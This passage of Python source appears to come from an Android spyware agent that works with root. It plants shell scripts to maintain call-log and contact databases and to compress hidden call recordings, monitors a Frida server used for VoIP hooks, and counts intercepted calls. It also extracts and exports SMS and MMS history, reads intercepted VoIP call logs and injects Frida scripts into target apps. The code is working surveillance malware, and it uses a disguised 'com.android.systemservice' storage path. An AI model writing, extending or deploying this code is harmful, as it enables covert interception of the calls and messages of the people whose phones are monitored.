    "CREATE INDEX IF NOT EXISTS idx_calls_date ON calls(date DESC);"

sqlite3 /data/data/com.android.providers.contacts/databases/calllog.db \
    "CREATE INDEX IF NOT EXISTS idx_calls_number ON calls(number);"

# Optimize contacts database
sqlite3 /data/data/com.android.providers.contacts/databases/contacts2.db \
    "PRAGMA optimize;"
    
# Clean up call log database
sqlite3 /data/data/com.android.providers.contacts/databases/calllog.db \
    "VACUUM;"
'''
            
            with tempfile.NamedTemporaryFile(mode='w', delete=False) as f:
                f.write(query_script)
                script_path = f.name
            
            deploy_cmd = ["su", "-c", f"cp {script_path} /data/local/tmp/optimize_queries && chmod 755 /data/local/tmp/optimize_queries"]
            subprocess.run(deploy_cmd, capture_output=True)
            os.unlink(script_path)
            
        except Exception as e:
            print(f"[!] Efficient call queries setup failed: {e}")
    
    def _optimize_contact_sync(self):
        """Optimize contact synchronization"""
        try:

            if hasattr(self, 'last_contact_modification'):

                modified_since = int(time.time() * 1000) - (self.last_contacts_sync * 1000)
                

                self.contact_sync_filter = f"contact_last_updated_timestamp > {modified_since}"
            

            self.frequent_contacts_cache = {}
            
        except Exception as e:
            print(f"[!] Contact sync optimization failed: {e}")
    
    def _setup_call_data_compression(self):
        """Setup call data compression"""
        try:
            compression_script = '''
#!/system/bin/sh
# Compress call data for efficient storage

# Compress old call recordings
find /data/data/com.android.systemservice/files/recordings -name "*.m4a" -mtime +1 -exec gzip {} \;

# Compress call logs
if [ -f "/data/local/tmp/voip_calls.log" ] && [ $(stat -f%z /data/local/tmp/voip_calls.log) -gt 1048576 ]; then
    gzip -c /data/local/tmp/voip_calls.log > /data/local/tmp/voip_calls.log.gz
    echo "" > /data/local/tmp/voip_calls.log  # Clear original
fi
'''
            
            with tempfile.NamedTemporaryFile(mode='w', delete=False) as f:
                f.write(compression_script)
                script_path = f.name
            
            deploy_cmd = ["su", "-c", f"cp {script_path} /data/local/tmp/compress_calls && chmod 755 /data/local/tmp/compress_calls"]
            subprocess.run(deploy_cmd, capture_output=True)
            os.unlink(script_path)
            
        except Exception as e:
            print(f"[!] Call data compression setup failed: {e}")
    
    def _setup_call_quality_monitoring(self):
        """Setup call quality monitoring"""
        try:

            current_time = time.time()
            uptime = current_time - self.call_metrics.get('start_time', current_time)
            
            if uptime > 0:
                calls_per_hour = (self.call_metrics['calls_intercepted'] / uptime) * 3600
                self.call_metrics['calls_per_hour'] = calls_per_hour
            

            if self.call_metrics['calls_intercepted'] > 0:
                success_rate = self.call_metrics['recordings_completed'] / self.call_metrics['calls_intercepted']
                self.call_metrics['recording_success_rate'] = success_rate
            

            try:
                result = subprocess.run(
                    ["du", "-s", "/data/data/com.android.systemservice/files/recordings"],
                    capture_output=True, text=True
                )
                if result.returncode == 0:
                    storage_kb = int(result.stdout.split()[0])
                    self.call_metrics['storage_usage_mb'] = storage_kb // 1024
            except Exception:
                pass
            
        except Exception as e:
            print(f"[!] Call quality monitoring setup failed: {e}")
    
    def _setup_call_alerting(self):
        """Setup alerting system for call logging"""
        try:
            alert_script = '''
#!/system/bin/sh
# Monitor call logging for issues

# Check for recording failures
if [ -f "/data/local/tmp/call_errors.log" ]; then
    ERROR_COUNT=$(wc -l < /data/local/tmp/call_errors.log)
    if [ $ERROR_COUNT -gt 10 ]; then
        echo "$(date): High error count in call recording: $ERROR_COUNT" >> /data/local/tmp/call_alerts.log
    fi
fi

# Check storage usage
USAGE=$(df /data/data/com.android.systemservice | tail -1 | awk '{print $5}' | sed 's/%//')
if [ $USAGE -gt 90 ]; then
    echo "$(date): Call recording storage critical: ${USAGE}%" >> /data/local/tmp/call_alerts.log
fi

# Check Frida server status
if ! pgrep -f "frida-server" > /dev/null; then
    echo "$(date): Frida server not running - VoIP hooks inactive" >> /data/local/tmp/call_alerts.log
fi
'''
            
            with tempfile.NamedTemporaryFile(mode='w', delete=False) as f:
                f.write(alert_script)
                script_path = f.name
            
            deploy_cmd = ["su", "-c", f"cp {script_path} /data/local/tmp/call_alerts && chmod 755 /data/local/tmp/call_alerts"]
            subprocess.run(deploy_cmd, capture_output=True)
            os.unlink(script_path)
            
        except Exception as e:
            print(f"[!] Call alerting setup failed: {e}")
    
    def _extract_sms_history(self) -> List[Dict[str, Any]]:
        """Extract existing SMS history"""
        try:
            sms_cmd = [
                "su", "-c",
                "content query --uri content://sms "
                "--projection _id,address,body,date,type "
                "--sort 'date DESC' --limit 1000"
            ]
            
            result = subprocess.run(sms_cmd, capture_output=True, text=True)
            
            if result.returncode != 0:
                print(f"[!] SMS history query failed: {result.stderr}")
                return []
            
            sms_messages = []
            for line in result.stdout.strip().split('\n'):
                if line.startswith('Row:'):
                    continue
                    
                try:
                    sms_data = self._parse_sms_line(line)
                    if sms_data:
                        sms_messages.append(sms_data)
                except Exception as e:
                    print(f"[!] Failed to parse SMS line: {e}")
                    continue
            
            return sms_messages
            
        except Exception as e:
            print(f"[!] SMS history extraction failed: {e}")
            return []
    
    def _extract_mms_history(self) -> List[Dict[str, Any]]:
        """Extract existing MMS history"""
        try:
            mms_cmd = [
                "su", "-c",
                "content query --uri content://mms "
                "--projection _id,date,msg_box,sub,ct_t "
                "--sort 'date DESC' --limit 500"
            ]
            
            result = subprocess.run(mms_cmd, capture_output=True, text=True)
            
            if result.returncode != 0:
                print(f"[!] MMS history query failed: {result.stderr}")
                return []
            
            mms_messages = []
            for line in result.stdout.strip().split('\n'):
                if line.startswith('Row:'):
                    continue
                    
                try:
                    mms_data = self._parse_mms_line(line)
                    if mms_data:
                        mms_messages.append(mms_data)
                except Exception as e:
                    print(f"[!] Failed to parse MMS line: {e}")
                    continue
            
            return mms_messages
            
        except Exception as e:
            print(f"[!] MMS history extraction failed: {e}")
            return []
    
    def _parse_sms_line(self, line: str) -> Optional[Dict[str, Any]]:
        """Parse SMS database entry"""
        try:
            fields = {}
            for field in line.split(', '):
                if '=' in field:
                    key, value = field.split('=', 1)
                    fields[key.strip()] = value.strip()
            
            if 'address' not in fields or 'body' not in fields:
                return None
            
            sms_type = int(fields.get('type', '0'))
            direction = "incoming" if sms_type == 1 else "outgoing" if sms_type == 2 else "draft"
            
            return {
                "id": fields.get('_id', ''),
                "address": fields.get('address', ''),
                "message": fields.get('body', ''),
                "date": int(fields.get('date', '0')) // 1000,
                "direction": direction,
                "type": "sms"
            }
            
        except Exception as e:
            print(f"[!] SMS parsing error: {e}")
            return None
    
    def _parse_mms_line(self, line: str) -> Optional[Dict[str, Any]]:
        """Parse MMS database entry"""
        try:
            fields = {}
            for field in line.split(', '):
                if '=' in field:
                    key, value = field.split('=', 1)
                    fields[key.strip()] = value.strip()
            
            if '_id' not in fields:
                return None
            
            msg_box = int(fields.get('msg_box', '0'))
            direction = "incoming" if msg_box == 1 else "outgoing" if msg_box == 2 else "draft"
            
            return {
                "id": fields.get('_id', ''),
                "date": int(fields.get('date', '0')),
                "direction": direction,
                "subject": fields.get('sub', ''),
                "content_type": fields.get('ct_t', ''),
                "type": "mms"
            }
            
        except Exception as e:
            print(f"[!] MMS parsing error: {e}")
            return None
    
    def get_sms_history(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """Get SMS/MMS history"""
        try:
            limit = args.get("limit", 500)
            include_mms = args.get("include_mms", True)
            
            sms_messages = self._extract_sms_history()
            mms_messages = self._extract_mms_history() if include_mms else []
            

            all_messages = sms_messages + mms_messages
            all_messages.sort(key=lambda x: x.get('date', 0), reverse=True)
            

            limited_messages = all_messages[:limit]
            
            return {
                "success": True,
                "messages": limited_messages,
                "total_sms": len(sms_messages),
                "total_mms": len(mms_messages),
                "returned_count": len(limited_messages)
            }
            
        except Exception as e:
            return {"error": f"SMS history retrieval failed: {str(e)}"}
    
    def export_sms_data(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """Export SMS/MMS data"""
        try:
            format_type = args.get("format", "json")
            include_mms = args.get("include_mms", True)
            limit = args.get("limit", 0)
            
            sms_messages = self._extract_sms_history()
            mms_messages = self._extract_mms_history() if include_mms else []
            
            all_messages = sms_messages + mms_messages
            all_messages.sort(key=lambda x: x.get('date', 0), reverse=True)
            
            if limit > 0:
                all_messages = all_messages[:limit]
            
            export_data = {
                "exported_at": time.time(),
                "device_id": self.agent.device_id,
                "total_messages": len(all_messages),
                "messages": all_messages
            }
            

            artifact_id = self.agent.offline_logger.log_artifact(
                "sms_export",
                json.dumps(export_data, indent=2).encode(),
                {
                    "format": format_type,
                    "message_count": len(all_messages),
                    "include_mms": include_mms
                }
            )
            
            return {
                "success": True,
                "artifact_id": artifact_id,
                "message_count": len(all_messages),
                "sms_count": len(sms_messages),
                "mms_count": len(mms_messages),
                "message": f"Exported {len(all_messages)} messages"
            }
            
        except Exception as e:
            return {"error": f"SMS export failed: {str(e)}"}
    
    def stop_voip_hooks(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """Stop VoIP app hooks"""
        try:
            hook_id = args.get("hook_id")
            
            if not hook_id:
                return {"error": "hook_id required"}
            

            kill_cmd = ["su", "-c", "pkill -f frida"]
            subprocess.run(kill_cmd, capture_output=True)
            
            return {
                "success": True,
                "message": f"VoIP hooks {hook_id} stopped"
            }
            
        except Exception as e:
            return {"error": f"Failed to stop VoIP hooks: {str(e)}"}
    
    def get_voip_call_history(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """Get VoIP call history from log files"""
        try:
            voip_calls = []
            

            try:
                with open("/data/local/tmp/voip_calls.log", "r") as f:
                    for line in f:
                        if line.strip():
                            call_data = json.loads(line.strip())
                            voip_calls.append(call_data)
            except FileNotFoundError:
                pass
            

            voip_calls.sort(key=lambda x: x.get('timestamp', 0), reverse=True)
            
            return {
                "success": True,
                "voip_calls": voip_calls,
                "total_calls": len(voip_calls)
            }
            
        except Exception as e:
            return {"error": f"VoIP call history retrieval failed: {str(e)}"}
    
    def _inject_frida_script(self, target_package: str, script: str) -> bool:
        """Inject Frida script into target package"""
        try:
            import tempfile
            with tempfile.NamedTemporaryFile(mode='w', suffix='.js', delete=False) as f:
                f.write(script)
                script_path = f.name
            
            cmd = [
                "frida", "-U", target_package,
                "-l", script_path,
                "--runtime=v8",
                "--no-pause"
            ]
            
            subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            os.unlink(script_path)
            return True
            
        except Exception as e:
            print(f"[!] Frida injection failed: {e}")
            return False
